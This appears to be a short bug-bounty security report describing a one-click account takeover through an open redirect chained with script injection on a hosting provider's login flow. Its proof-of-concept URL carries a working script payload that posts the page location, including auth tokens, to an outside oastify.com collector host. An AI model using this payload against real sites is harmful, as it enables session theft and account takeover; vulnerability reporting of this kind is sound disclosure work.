# Security Finding: One-Click Account Takeover (ATO) via Chained Redirect

## Summary
Discovered a potential One-Click Account Takeover (ATO) due to an **Open Redirect** vulnerability in a whitelisted subdomain, allowing for **Authentication Token theft** via script injection.

## Target Details
* **Target Domain:** `[TARGET_DOMAIN.com]`
* **Vulnerable Main Endpoint:** `[AUTH_OR_LOGIN.DOMAIN.com]/login/?redirectUrl=[... ]`
* **Vulnerable Subdomain/Redirector:** `[VULNERABLE.SUBDOMAIN.com]`
* **Whitelisted Parameter:** `[PARAM_NAME]` (e.g., `redirectUrl` or `next`)

## Steps To Reproduce (POC)

1.  A logged-in victim visits the following malicious, crafted URL.
2.  The URL exploits the whitelisting logic to pass through the main auth flow.
3.  The inner redirect parameter is used to inject a script payload.

### **Malicious URL Structure**
```
https://auth.hostinger.com/login/?redirectUrl=https://marketing.hostinger.com/en-us/marketplace_wix/site_not_published?redirect_url=x"></a><script>fetch('wqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com',%20{method:%20'POST',body:%20window.location});</script>

```
